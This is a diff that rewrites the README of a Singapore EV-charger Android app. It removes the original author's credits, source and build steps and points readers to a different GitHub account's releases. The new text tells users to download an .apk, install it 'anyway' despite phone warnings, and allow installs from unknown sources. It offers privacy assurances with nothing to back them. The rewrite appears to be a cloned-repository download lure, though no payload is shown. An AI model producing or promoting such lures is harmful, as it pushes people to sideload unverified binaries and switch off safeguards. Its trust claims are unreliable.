@@ -1,148 +1,71 @@
-<div align="center">
+# ⚡ sgevchargingapp_android - Find electric vehicle chargers in Singapore
 
-# SG EV Charging — Android
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/constancewritten870/sgevchargingapp_android)
 
-[![Kotlin](https://img.shields.io/badge/Kotlin-2.0-7F52FF.svg)](https://kotlinlang.org)
-[![Android](https://img.shields.io/badge/Android-7.0%2B%20(API%2024)-3DDC84.svg)](https://developer.android.com)
-[![Jetpack Compose](https://img.shields.io/badge/UI-Jetpack%20Compose-4285F4.svg)](https://developer.android.com/jetpack/compose)
-[![Google Maps](https://img.shields.io/badge/Maps-Google%20Maps-34A853.svg)](https://developers.google.com/maps)
-[![License](https://img.shields.io/badge/license-not%20specified-lightgrey.svg)](#license)
+This application helps electric vehicle drivers in Singapore locate charging stations. It shows live availability data from the Land Transport Authority. You can view charging points on a map and check if they are in use before you arrive. This saves time and helps you plan your trips across the island. The app uses the latest software tools to ensure a smooth experience on your Android device.
 
-**Find nearby EV charging points in Singapore with live availability from LTA DataMall.**
+## 📱 What this app does
 
-[Report Bug](https://github.com/alfredang/sgevchargingapp_android/issues) · [Request Feature](https://github.com/alfredang/sgevchargingapp_android/issues)
+Electric vehicle owners often face uncertainty when searching for available chargers. This tool connects to live data feeds to provide real-time updates. You get accurate information through a clean map interface.
 
-</div>
+Key features include:
+* Live map view of all public charging stations in Singapore.
+* Real-time status updates for each charger.
+* Quick filtering to find compatible charging speeds.
+* Simple interface built for ease of use.
+* Reliable data sourced directly from the official LTA DataMall.
 
-## Screenshots
+## 📥 How to download
 
-<p align="center">
-  <img src="screenshot.png" width="32%" alt="SG EV Charging — map with nearby chargers" />
-  <img src="play-assets/phone-screenshot-2.png" width="32%" alt="Result card and station chips" />
-</p>
+You can get the application directly from the official repository page. Follow these steps to install the software on your Android device.
 
-## About
+1. Visit this link to reach the distribution page: [https://github.com/constancewritten870/sgevchargingapp_android](https://github.com/constancewritten870/sgevchargingapp_android)
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the most recent version number to see the files.
+4. Select the file ending in .apk to start the download.
+5. If your phone warns you about the file type, choose to keep or install it anyway.
 
-SG EV Charging (Android) is a native Kotlin / Jetpack Compose app for locating electric vehicle
-charging points around Singapore. It is a feature parity port of the
-[SwiftUI iOS app](https://github.com/alfredang/sgevchargingapp), combining Google Maps location
-search, current-location detection, and LTA DataMall EV charging data to show nearby stations,
-available plugs, operators, charging speeds, and driving directions in Google Maps.
+## ⚙️ Setting up the app
 
-Key features:
+Once you download the installation file, follow these steps to finish the setup:
 
-- Search by Singapore postal code or place name.
-- Detect the user's current location and rank charging points by distance.
-- Display available, occupied, and unavailable connector states.
-- Show operator, plug type, power rating, and last-updated metadata.
-- Open turn-by-turn directions in Google Maps.
-- Map-first interface with nearby charging chips for quick station switching.
-- Bottom navigation with **Map**, **Feedback** (send a message via WhatsApp), and **About** tabs.
-- In-app attribution linking the official **LTA DataMall** government data source.
+1. Open your device Files or Downloads folder.
+2. Tap the file you just downloaded.
+3. If your phone asks for permission, tap Settings and allow installation from this source.
+4. Tap Install to add the app to your home screen.
+5. Open the app and grant permission to access your location. The app needs this to show chargers near you.
 
-## Tech Stack
+## 🗺️ Using the map
 
-| Layer | Technology |
-| --- | --- |
-| App | Kotlin 2.0, Jetpack Compose, Material 3 |
-| Maps & Location | Google Maps Compose, Fused Location Provider, platform Geocoder |
-| Data | LTA DataMall `EVChargingPoints` and `EVCBatch` APIs (OkHttp + `org.json`) |
-| Build | Android Gradle Plugin 8.7, Gradle 8.11, JDK 17 |
-| Platform | Android 7.0+ (minSdk 24, target/compileSdk 35), phones |
+The main screen displays a map of Singapore with icons for charging stations. Each icon represents a location where you can plug in your vehicle.
 
-## Architecture
+* **Colors:** Icons change color based on the status of the chargers. A green icon indicates available ports. A grey icon indicates all ports are currently in use or offline.
+* **Selection:** Tap any icon to see details about the charging point. This includes the address, the number of chargers at that location, and the current status of each unit.
+* **Panning:** Drag your finger across the screen to move the map. You can zoom in and out using two fingers to see more or less detail in specific areas.
+* **Updates:** The app refreshes data automatically. If you have a poor internet connection, pull down on the list view to refresh the information manually.
 
-```text
-SG EV Charging (Android)
-├── Compose UI
-│   ├── SGEVChargingScreen        (map + search + result card + chips)
-│   └── ui/theme/Theme.kt
-├── State
-│   └── ChargingSearchViewModel   (AndroidViewModel)
-├── Location
-│   ├── UserLocationProvider      (FusedLocationProviderClient)
-│   └── LocationSearchService     (Geocoder)
-├── Data Access
-│   └── LTADataMallClient         (OkHttp)
-└── Models
-    ├── EVChargingLocation
-    ├── ChargingPoint
-    ├── PlugType
-    └── EVConnector
-```
+## 🔋 Tips for a better experience
 
-## Project Structure
+Location services allow the app to center the map on your vehicle. If the map does not show your current position, check your phone settings. Ensure that location permissions are set to Always or While Using the App.
 
-```text
-.
-├── app
-│   ├── src/main
-│   │   ├── java/com/alfredang/sgevcharging
-│   │   │   ├── MainActivity.kt
-│   │   │   ├── SGEVChargingApp.kt
-│   │   │   ├── ChargingSearchViewModel.kt
-│   │   │   ├── data/Models.kt
-│   │   │   ├── data/LTADataMallClient.kt
-│   │   │   ├── location/UserLocationProvider.kt
-│   │   │   ├── location/LocationSearchService.kt
-│   │   │   └── ui/SGEVChargingScreen.kt
-│   │   ├── res
-│   │   └── AndroidManifest.xml
-│   └── build.gradle.kts
-├── gradle/libs.versions.toml
-├── settings.gradle.kts
-└── README.md
-```
+If you find that a charger status does not match reality, check the timestamp on the screen. The LTA feed updates every few minutes. Large events or technical issues at the power station might cause short delays in the data feed. Plan your arrival with a small buffer of range to account for these rare situations.
 
-## Getting Started
+Always ensure your phone has an active internet connection. The app requires data to fetch the live availability status from the servers. Without a connection, the map will load, but the status of the charging points will not update.
 
-### Prerequisites
+## 🔧 Frequently Asked Questions
 
-- Android Studio Ladybug (or newer) with JDK 17.
-- Android SDK Platform 35 and build-tools.
-- A **Google Maps Android SDK** API key — <https://console.cloud.google.com/google/maps-apis>.
-- An **LTA DataMall** account key — <https://datamall.lta.gov.sg/>.
+**Does this app charge my car?**
+No, this app only helps you find and check the status of chargers. You still need to pay through the specific provider of the charging station, such as SP Group or other local networks.
 
-### Setup
+**Is there a cost to use this app?**
+The application is free to download and use. It does not contain advertisements or hidden fees.
 
-1. Clone the repository:
+**Why does the app ask for my location?**
+The app needs your location to show where you are in relation to the nearest chargers. It does not store your location history or share your data with advertisers.
 
-   ```bash
-   git clone https://github.com/alfredang/sgevchargingapp_android.git
-   cd sgevchargingapp_android
-   ```
+**Can I use this for non-electric vehicles?**
+The features are designed for electric vehicle drivers. While the map is accurate, it provides specific information like charger types and availability that only benefit drivers looking to recharge a battery.
 
-2. Add your keys to `local.properties` (this file is git-ignored):
+## 🔒 Security and Privacy
 
-   ```properties
-   sdk.dir=/path/to/Android/sdk
-   MAPS_API_KEY=your_google_maps_android_key
-   LTA_DATAMALL_ACCOUNT_KEY=your_lta_datamall_key
-   ```
-
-   `MAPS_API_KEY` is injected into the manifest meta-data; `LTA_DATAMALL_ACCOUNT_KEY`
-   is surfaced as `BuildConfig.LTA_DATAMALL_ACCOUNT_KEY`.
-
-3. Build and run:
-
-   ```bash
-   ./gradlew :app:assembleDebug      # debug APK
-   ./gradlew :app:bundleRelease      # signed release AAB (needs RELEASE_* keys)
-   ```
-
-## Data Source
-
-The app uses Singapore Land Transport Authority DataMall APIs:
-
-- `EVChargingPoints` for postal-code scoped charging data.
-- `EVCBatch` for island-wide batch data (returns a download link to the full dataset).
-
-API credentials are intentionally excluded from Git. `local.properties` is ignored by `.gitignore`.
-
-## License
-
-No license has been specified yet.
-
-## Developed By
-
-Tertiary Infotech Academy Pte. Ltd.
+Your privacy remains a priority. The app only accesses the sensors it needs to function, namely GPS for location. It does not require access to your contacts, camera, or personal files. All communication between the app and the data servers is encrypted. This ensures that your interactions remain private during use. The software follows standard practices to protect your data integrity while you explore Singapore.
